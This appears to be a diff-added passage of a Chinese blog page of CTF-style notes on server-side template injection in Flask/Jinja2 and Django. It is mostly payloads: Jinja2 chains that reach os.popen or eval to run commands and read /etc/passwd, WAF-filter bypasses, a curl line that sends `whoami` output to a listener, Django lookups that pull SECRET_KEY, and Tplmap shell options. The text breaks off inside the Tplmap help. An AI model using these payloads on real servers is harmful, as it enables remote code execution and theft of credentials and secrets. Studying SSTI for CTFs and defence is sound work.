+<h3 id="代码基础"><a href="#代码基础" class="headerlink" title="代码基础"></a>代码基础</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__dict__　　 ：保存类实例或对象实例的属性变量键值对字典</span><br><span class="line">__class__　　：返回一个实例所属的类</span><br><span class="line">__mro__　　  ：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__bases__　　：以元组形式返回一个类直接所继承的类（可以理解为直接父类）__base__　　 ：和上面的bases大概相同，都是返回当前类所继承的类，即基类，区别是base返回单个，bases返回是元组</span><br><span class="line">// __base__和__mro__都是用来寻找基类的</span><br><span class="line">__subclasses__　　：以列表返回类的子类</span><br><span class="line">__init__　　 ：类的初始化方法</span><br><span class="line">__globals__　　   ：对包含函数全局变量的字典的引用__builtin__&amp;&amp;__builtins__　</span><br><span class="line">：python中可以直接运行一些函数，例如<span class="built_in">int</span>()，<span class="built_in">list</span>()等等。　　　　　　　　　　　　　　　　　　这些函数可以在__builtin__可以查到。查看的方法是<span class="built_in">dir</span>(__builtins__)　　　　　　　　　　　　　　　　　　在py3中__builtin__被换成了builtin　　　　　　　　　　　　　　　　　　<span class="number">1.</span>在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__。　　　　　　　　　　　　　　　　　　<span class="number">2.</span>非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身</span><br></pre></td></tr></table></figure>
+
+<h4 id="class"><a href="#class" class="headerlink" title="class"></a>class</h4><p>__class__是类中的一个内置属性，值是该实例的对应的类。这里使用的是’’.<strong>class</strong>，得到的则是空字符串对应的类，也就是字符类。这样操作的意义是将我们现在操作的对象切换到类上面去，这样才能进行之后继承与被继承的操作，所以这里可以选用其他数据类型再来调用__class__属性，效果是一样的(例如[].<strong>class</strong>、{}.<strong>class</strong>、True.__class等)。</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20230702182915221.png"
+                       
+                 ></p>
+<h4 id="base"><a href="#base" class="headerlink" title="base"></a>base</h4><p><strong>base__也是类中的一个内置属性，值当前类的父类，而在python中object是一切类最顶层的父类，也就是说我们可以过上一步获取到的类往上获取(一般数据类型的上一层父类中便有object)，最终便会获取到object，而由于object的特殊性，我们便能从object往下获取到其他所有的类，其中便有着能实现我们读取flag功能的类。(其他类似功能的还有__bases</strong>、<strong>mro</strong>，但返回的数据包含类的元组，所以还需要下标选定object类)</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20230702182957759.png"
+                        alt="image-20230702182957759"
+                 ></p>
+<h4 id="subclasses"><a href="#subclasses" class="headerlink" title="subclasses"></a>subclasses</h4><p> <strong>subclasses</strong> ()是类中的一个内置方法，返回值是包含当前类所有子类的一个列表，通过上一步获取到的object我们实现了向下获取，接着我们需要在这些子类中获取合适的类(下方截图只展示了一部分)。不一定是所有类里都有init方法或者globals方法，可以用脚本跑，而向下面我贴出的常用payload中subclasses()[]大括号里调用的是第几个类，每个人python环境不一样类在的地方就不一样</p>
+<p><code>&#123;&#123;''.__class__.__base__.__subclasses__()[80].__init__.__globals__['__builtins__'].eval("__import__('os').popen('type flag.txt').read()")&#125;&#125;</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20230702183035288.png"
+                        alt="image-20230702183035288"
+                 ></p>
+<h4 id="init"><a href="#init" class="headerlink" title="init"></a>init</h4><p> __init__是类中的内置方法，在这个类实例化是自动被调用，但是返回值只能是None，且在调用是必须传入该类的实例对象。如果我们不去调用它，此时我们获得的是我们选取的类中的__init__这个函数。由于python一切皆对象的特性，函数本质上也是对象，也存在类中的一些内置方法和内置属性，所以我们可以执行接下来的操作。</p>
+<h4 id="builtins"><a href="#builtins" class="headerlink" title="builtins"></a>builtins</h4><p> 选中”<strong>builtins</strong>“模块，在这个模块中有很多我们常用的内置函数和类，其中就有eval函数</p>
+<p>‘’.<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[80].<strong>init</strong>.<strong>globals</strong>[‘<strong>builtins</strong>‘].eval(“<strong>import</strong>(‘os’).popen(‘type flag.txt’).read()”)</p>
+<p>如在前面所说，此处就是利用eval函数，eval函数将参数字符串当成python代码执行。__import__相当于import，区别在于__import__引入模块后我们可以直接使用符号”.”在引入带后面调用模块中的函数。popen函数返回结果是一个object，所以还需要read方法将结果读取出来，至于system函数我们试着只能看到执行结果状态码，所以不考虑使用。</p>
+<h3 id="一些Payload"><a href="#一些Payload" class="headerlink" title="一些Payload"></a>一些Payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">80</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;type flag.txt&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">80</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>).read()&#125;&#125;</span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">&#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">&#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;type flag.txt&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个payload要求选取一个通用的合适的类(比如这个”catch_warnings”)，保证不同设置下Flask都能获取到这个类</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;type flag.txt&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>python3已经移除了file。所以利用file子类文件读取只能在python2中用。</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;file&#x27;</span> %&#125;</span><br><span class="line">&#123;&#123; c(<span class="string">&quot;/etc/passwd&quot;</span>).readlines() &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">获得基类</span><br><span class="line"><span class="comment">#python2.7</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">request.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line"><span class="comment">#python3.7</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__。。。class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">request.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#python 2.7</span></span><br><span class="line"><span class="comment">#文件操作</span></span><br><span class="line"><span class="comment">#找到file类</span></span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>]</span><br><span class="line"><span class="comment">#读文件</span></span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="comment">#写文件</span></span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/tmp&#x27;</span>).write(<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#命令执行</span></span><br><span class="line"><span class="comment">#os执行</span></span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache下有os类，可以直接执行命令：</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.popen(<span class="string">&#x27;id&#x27;</span>).read()</span><br><span class="line"><span class="comment">#eval,impoer等全局函数</span></span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__下有<span class="built_in">eval</span>，<span class="built_in">__import__</span>等的全局函数，可以利用此来执行命令：</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;id&#x27;</span>).read()</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;id&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment">#python3.7</span></span><br><span class="line"><span class="comment">#命令执行</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"><span class="comment">#文件操作</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;filename&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"><span class="comment">#windows下的os命令</span></span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">118</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;dir&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+
+<h3 id="查类脚本"><a href="#查类脚本" class="headerlink" title="查类脚本"></a>查类脚本</h3><h4 id="os"><a href="#os" class="headerlink" title="os"></a>os</h4><p>上面的实例中我们使用dir把内置的对象列举出来，其实可以用__globals__更深入的去看每个类可以调用的东西（包括模块，类，变量等等），如果有os这种可以直接传入命令，造成命令执行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">search = <span class="string">&#x27;os&#x27;</span> <span class="comment">#也可以是其他你想利用的模块</span></span><br><span class="line">num = -<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            <span class="built_in">print</span>(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span> </span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20230702184939468.png"
+                        alt="image-20230702184939468"
+                 ></p>
+<p>所以可以构造：().<strong>class</strong>.<strong>bases</strong>[0].<strong>subclasses</strong>()[152].<strong>init</strong>.<strong>globals</strong>[‘os’].system(‘whoami’)</p>
+<h4 id=""><a href="#" class="headerlink" title=""></a><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20230702185018493.png"
+                        alt="image-20230702185018493"
+                 ></h4><h4 id="builtins-1"><a href="#builtins-1" class="headerlink" title="builtins"></a><strong>builtins</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">search = <span class="string">&#x27;__builtins__&#x27;</span></span><br><span class="line">num = -<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># print(i.__init__.__globals__.keys())</span></span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            <span class="built_in">print</span>(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20230702185040431.png"
+                        alt="image-20230702185040431"
+                 ></p>
+<p>构造如：().<strong>class</strong>.<strong>bases</strong>[0].<strong>subclasses</strong>()[215].<strong>init</strong>.<strong>globals</strong>[‘<strong>builtins</strong>‘]<a href="%22__import__('os').system('whoami')%22">‘eval’</a></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20230702185145682.png"
+                        alt="image-20230702185145682"
+                 ></p>
+<h3 id="绕WAF"><a href="#绕WAF" class="headerlink" title="绕WAF"></a>绕WAF</h3><h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤["></a>过滤[</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#getitem、pop</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">40</span>)(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.linecache.os.popen(<span class="string">&#x27;ls&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+
+<h4 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#chr函数</span></span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.<span class="built_in">chr</span> %&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">40</span>)(<span class="built_in">chr</span>(<span class="number">47</span>)%2bchr(<span class="number">101</span>)%2bchr(<span class="number">116</span>)%2bchr(<span class="number">99</span>)%2bchr(<span class="number">47</span>)%2bchr(<span class="number">112</span>)%2bchr(<span class="number">97</span>)%2bchr(<span class="number">115</span>)%2bchr(<span class="number">115</span>)%2bchr(<span class="number">119</span>)%2bchr(<span class="number">100</span>)).read()&#125;&#125;<span class="comment">#request对象</span></span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">40</span>)(request.args.path).read() &#125;&#125;&amp;path=/etc/passwd</span><br><span class="line"><span class="comment">#命令执行</span></span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.<span class="built_in">chr</span> %&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.linecache.os.popen(<span class="built_in">chr</span>(<span class="number">105</span>)%2bchr(<span class="number">100</span>)).read() &#125;&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd=<span class="built_in">id</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="过滤下划线"><a href="#过滤下划线" class="headerlink" title="过滤下划线"></a>过滤下划线</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>[request.args.<span class="keyword">class</span>][request.args.mro][<span class="number">2</span>][request.args.subclasses]()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read() &#125;&#125;&amp;<span class="keyword">class</span>=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</span><br></pre></td></tr></table></figure>
+
+<h4 id="过滤花括号"><a href="#过滤花括号" class="headerlink" title="过滤花括号"></a>过滤花括号</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用&#123;%%&#125;标记</span></span><br><span class="line">&#123;% <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.popen(<span class="string">&#x27;curl http://127.0.0.1:7999/?i=`whoami`&#x27;</span>).read()==<span class="string">&#x27;p&#x27;</span> %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;</span>) &#125;&#125;         //popen的参数就是要执行的命令</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h2><p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/cimuhuashuimu/p/11544455.html" >https://www.cnblogs.com/cimuhuashuimu/p/11544455.html<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h2><p>漏洞代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def view(request, *args, **kwargs):</span><br><span class="line">    template = &#x27;Hello &#123;user&#125;, This is your email: &#x27; + request.GET.get(&#x27;email&#x27;)</span><br><span class="line">    return HttpResponse(template.format(user=request.user))</span><br></pre></td></tr></table></figure>
+
+<p>很明显 email 就是注入点，但是条件被限制的很死，很难执行命令，现在拿到的只有有一个和user有关的变量request.user ，这个时候我们就应该在没有应用源码的情况下去寻找框架本身的属性，看这个空框架有什么属性和类之间的引用。</p>
+<p>后来发现Django自带的应用 “admin”（也就是Django自带的后台）的models.py中导入了当前网站的配置文件：</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20230702185509813.png"
+                        alt="image-20230702185509813"
+                 ></p>
+<p>所以可以通过某种方式，找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。</p>
+<p>payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8000/?email=&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><br><span class="line"></span><br><span class="line">http://localhost:8000/?email=&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set o1=(dict(o=a,s=n))|join%&#125;&#123;%set re=(dict(re=a,ad=n))|join%&#125;&#123;%set pppct=(dict(po=a,pen=n))|join%&#125;&#123;%set%20a=(lipsum|string|list)|attr(%27pop%27)(18)%&#125;&#123;%set%20glob=(a,a,(dict(glo=a,bals=b)|join),a,a)|join%&#125;&#123;%set gt=(a,a,(dict(geti=a,tem=n)|join),a,a)|join%&#125;&#123;&#123;lipsum|attr(glob)|attr(gt)(o1)|attr(pppct)(&#x27;cat /flag&gt;&gt;app.py&#x27;)|attr(re)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Tplmap"><a href="#Tplmap" class="headerlink" title="Tplmap"></a>Tplmap</h1><p>Tplmap是一个python工具，可以通过使用沙箱转义技术找到代码注入和服务器端模板注入（SSTI）漏洞。该工具能够在许多模板引擎中利用SSTI来访问目标文件或操作系统。一些受支持的模板引擎包括PHP（代码评估），Ruby（代码评估），JaveScript（代码评估），Python（代码评估），ERB，Jinja2和Tornado。该工具可以执行对这些模板引擎的盲注入，并具有执行远程命令的能力。</p>
+<p>主要就是探测注入点</p>
+<p> python - u 接’url’</p>
+<p>注shell</p>
+<p>python -u ‘url’ –os-shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Usage: python tplmap.py [options]</span><br><span class="line"> </span><br><span class="line">选项:</span><br><span class="line">  -h, --<span class="built_in">help</span>          显示帮助并退出</span><br><span class="line"> </span><br><span class="line">目标:</span><br><span class="line">  -u URL, --url=URL   目标 URL</span><br><span class="line">  -X REQUEST, --re..  强制使用给定的HTTP方法 (e.g. PUT)</span><br><span class="line"> </span><br><span class="line">请求:</span><br><span class="line">  -d DATA, --data=..  通过POST发送的数据字符串 它必须作为查询字符串: param1=value1&amp;param2=value2</span><br><span class="line">  -H HEADERS, --he..  附加标头 (e.g. <span class="string">&#x27;Header1: Value1&#x27;</span>) 多次使用以添加新的标头</span><br><span class="line">  -c COOKIES, --co..  Cookies (e.g. <span class="string">&#x27;Field1=Value1&#x27;</span>) 多次使用以添加新的Cookie</span><br><span class="line">  -A USER_AGENT, -..  HTTP User-Agent 标头的值</span><br><span class="line">  --proxy=PROXY       使用代理连接到目标URL</span><br><span class="line"> </span><br><span class="line">检测:</span><br><span class="line">  --level=LEVEL       要执行的代码上下文转义级别 (<span class="number">1</span>-<span class="number">5</span>, Default: <span class="number">1</span>)</span><br><span class="line">  -e ENGINE, --eng..  强制将后端模板引擎设置为此值</span><br><span class="line">  -t TECHNIQUE, --..  技术 R:渲染 T:基于时间的盲注 Default: RT</span><br><span class="line"> </span><br><span class="line">操作系统访问:</span><br><span class="line">  --os-cmd=OS_CMD     执行操作系统命令</span><br><span class="line">  --os-shell          提示交互式操作系统Shell</span><br><span class="line">  --upload=UPLOAD     上传本地文件到远程主机</span><br><span class="line">  --force-overwrite   上传时强制覆盖文件</span><br><span class="line">  --download=DOWNL..  下载远程文件到本地主机</span><br><span class="line">  --bind-shell=BIN..  在目标的TCP端口上生成系统Shell并连接到它</span><br><span class="line">  --reverse-shell=..  运行系统Shell并反向连接到本地主机端口</span><br><span class="line"> 